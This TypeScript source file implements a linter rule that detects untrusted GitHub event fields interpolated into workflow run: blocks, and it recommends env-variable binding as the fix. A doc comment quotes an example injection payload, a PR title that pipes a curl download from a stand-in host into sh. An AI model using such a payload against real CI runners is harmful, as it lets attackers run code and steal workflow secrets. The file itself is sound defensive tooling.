import { defineTextDiagnostic } from "../../core/text-scan.ts";
import {
  blockScalarBody,
  blockScalarMask,
  isWorkflowFile,
  parentKeyOf,
  parseKeyLine,
  splitLines,
} from "./context.ts";

/**
 * An attacker-controlled GitHub context interpolated straight into a `run:` block.
 *
 * `${{ }}` is not a shell variable — the runner substitutes the value into the
 * script *before* handing it to bash, so the text becomes part of the program.
 * A pull request titled `"; curl evil.sh | sh; #` therefore executes on the
 * runner with the workflow's `GITHUB_TOKEN` and every secret in scope, and it
 * is exploitable by anyone who can open an issue.
 *
 * The documented fix is an intermediate environment variable, and this check is
 * deliberately silent on it: the expression is then evaluated into `env:`, where
 * it is data the process receives, and the script only ever sees `"$TITLE"`.
 *
 * ❌ run: echo "${{ github.event.issue.title }}"
 * ✅ env: { TITLE: "${{ github.event.issue.title }}" }
 *    run: echo "$TITLE"
 * ✅ run: echo "${{ github.sha }}"        // not attacker-controlled
 */

/**
 * GitHub's own list of untrusted inputs. Every path here can be set to an
 * arbitrary string by someone with no write access to the repository. Contexts
 * only a collaborator can influence (`inputs.*`, `github.actor`) are
 * deliberately absent, as are the constrained ones (`github.sha`,
 * `github.ref`, `github.repository`) whose charset cannot express a shell
 * metacharacter — flagging those would bury the finding that matters.
 */
const UNTRUSTED_PATHS = [
  "github.event.comment.body",
  "github.event.commits.*.author.email",
  "github.event.commits.*.author.name",
  "github.event.commits.*.message",
  "github.event.discussion.body",
  "github.event.discussion.title",
  "github.event.head_commit.author.email",
  "github.event.head_commit.author.name",
  "github.event.head_commit.message",
  "github.event.issue.body",
  "github.event.issue.title",
  "github.event.pages.*.page_name",
  "github.event.pull_request.body",
  "github.event.pull_request.head.label",
  "github.event.pull_request.head.ref",
  "github.event.pull_request.head.repo.default_branch",
  "github.event.pull_request.head.repo.description",
  "github.event.pull_request.head.repo.homepage",
  "github.event.pull_request.title",
  "github.event.review.body",
  "github.event.review_comment.body",
  "github.head_ref",
];

/** `a.*.b` is also written `a[0].b`, so the dot before an index is optional. */
const pathToPattern = (path: string): string =>
  path
    .split(".")
    .map((segment, i) =>
      segment === "*"
        ? "(?:\\.\\*|\\[\\d+\\])"
        : (i > 0 ? "\\." : "") + segment.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
    )
    .join("");

/** Boundaries stop `github.head_ref_x` and `x.github.head_ref` from matching. */
const UNTRUSTED_RE = new RegExp(`(?<![\\w.])(${UNTRUSTED_PATHS.map(pathToPattern).join("|")})(?![\\w.])`);

/** `${{ … }}`, non-greedy so adjacent expressions stay separate. */
const EXPRESSION_RE = /\$\{\{([\s\S]*?)\}\}/g;

/**
 * `toJSON()` emits a JSON-escaped string literal, the other sanctioned way to
 * move untrusted data across the boundary. Flagging it would punish the fix.
 */
const TO_JSON_RE = /\btojson\s*\(/i;

interface ShellSegment {
  lineIndex: number;
  text: string;
  /** 0-based offset of `text` within its original line. */
  column: number;
}

/**
 * Every chunk of shell text a workflow will execute: the value of an inline
 * `run:` and the body of a `run: |` block. Nothing else — an expression under
 * `env:`, `if:` or `with:` is evaluated as data, not as code.
 */
const shellSegments = (lines: string[], mask: boolean[]): ShellSegment[] => {
  const segments: ShellSegment[] = [];
  for (let i = 0; i < lines.length; i++) {
    if (mask[i]) continue;
    const parsed = parseKeyLine(lines[i]!);
    if (!parsed || parsed.key !== "run") continue;
    // `with: { run: … }` is an input an action reads, not a script the runner executes.
    if (parentKeyOf(lines, mask, i) === "with") continue;
    if (/^[|>]/.test(parsed.value)) {
      for (const j of blockScalarBody(lines, i, parsed.keyColumn)) {
        segments.push({ lineIndex: j, text: lines[j]!, column: 0 });
      }
    } else if (parsed.value.trim().length > 0) {
      segments.push({ lineIndex: i, text: parsed.value, column: parsed.valueColumn });
    }
  }
  return segments;
};

export const ciScriptInjection = defineTextDiagnostic({
  id: "ci-script-injection",
  title: "Attacker-controlled GitHub context interpolated into a run: block",
  severity: "error",
  category: "Security",
  confidence: "high",
  tags: ["ci", "injection"],
  files: [".github/workflows/*.yml", ".github/workflows/*.yaml"],
  maxBytes: 256 * 1024,
  recommendation:
    'Bind the value to a step-level `env:` entry (TITLE: ${{ github.event.issue.title }}) and reference it in the script as a quoted shell variable ("$TITLE"). The runner then hands the text to the process as an environment value, so the shell never parses it as syntax.',
  scan: (ctx) => {
    if (!isWorkflowFile(ctx.content)) return;
    const lines = splitLines(ctx.content);
    const mask = blockScalarMask(lines);

    for (const segment of shellSegments(lines, mask)) {
      EXPRESSION_RE.lastIndex = 0;
      let match: RegExpExecArray | null;
      while ((match = EXPRESSION_RE.exec(segment.text)) !== null) {
        const expression = match[1]!;
        if (TO_JSON_RE.test(expression)) continue;
        const hit = UNTRUSTED_RE.exec(expression);
        if (!hit) continue;
        ctx.report({
          line: segment.lineIndex + 1,
          column: segment.column + match.index + 1,
          message: `\`${hit[1]!}\` is attacker-controlled and is substituted into this shell command before it runs — crafted text executes arbitrary commands on the runner with the workflow's token.`,
        });
      }
    }
  },
});
